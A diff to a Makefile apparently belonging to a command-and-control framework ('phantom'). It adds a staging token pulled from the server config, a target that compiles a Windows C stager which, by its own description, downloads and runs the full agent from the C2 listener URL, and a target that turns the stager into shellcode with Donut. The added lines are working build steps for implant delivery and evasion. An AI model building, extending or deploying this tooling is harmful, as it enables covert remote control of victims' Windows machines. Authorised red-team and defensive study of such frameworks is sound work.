@@ -12,6 +12,7 @@ JITTER       ?= 20
 FRONT_DOMAIN ?=
 HOST_HEADER  ?=
 SERVER_PUBKEY := $(shell openssl rsa -pubin -in configs/server.pub -outform DER 2>/dev/null | base64 -w0)
+STAGING_TOKEN ?= $(shell sed -n 's/^[[:space:]]*staging_token:[[:space:]]*"\([^"]*\)".*/\1/p' configs/server.yaml | head -1)
 
 # ──────────────── Server ────────────────
 
@@ -112,6 +113,22 @@ agent-shellcode: agent-windows ## Generate PIC shellcode from Windows agent via 
 	      -a 2 -b 1 -e 3 -z 2
 	@echo "[+] Shellcode: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.bin"
 	@ls -lh $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.bin
+
+.PHONY: agent-stager
+agent-stager: ## Build the Windows C stager (downloads + runs the full agent)
+	@mkdir -p $(AGENT_DIR)
+	x86_64-w64-mingw32-gcc -O2 -s -o $(AGENT_DIR)/phantom-stager_windows_amd64.exe \
+	  -DC2_URL='"$(LISTENER_URL)/api/v1/update"' \
+	  -DSTAGING_TOKEN='"$(STAGING_TOKEN)"' \
+	  payloads/stager/windows/stager.c -lwininet
+	@echo "[+] Stager: $(AGENT_DIR)/phantom-stager_windows_amd64.exe"
+
+.PHONY: agent-stager-shellcode
+agent-stager-shellcode: agent-stager ## Convert the C stager to shellcode via Donut
+	@python3 -c "import donut" 2>/dev/null || (echo "[-] donut-shellcode not installed: pip3 install --break-system-packages donut-shellcode"; exit 1)
+	@mkdir -p $(AGENT_DIR)
+	@python3 -c "import donut; sc=donut.create(file='$(AGENT_DIR)/phantom-stager_windows_amd64.exe', arch=2, entropy=3, compress=2); open('$(AGENT_DIR)/phantom-stager_windows_amd64.bin','wb').write(sc)"
+	@echo "[+] Stager shellcode: $(AGENT_DIR)/phantom-stager_windows_amd64.bin"
 
 .PHONY: agent-all
 agent-all: agent-windows agent-linux agent-darwin agent-dll ## Build all agent variants (shellcode requires donut)
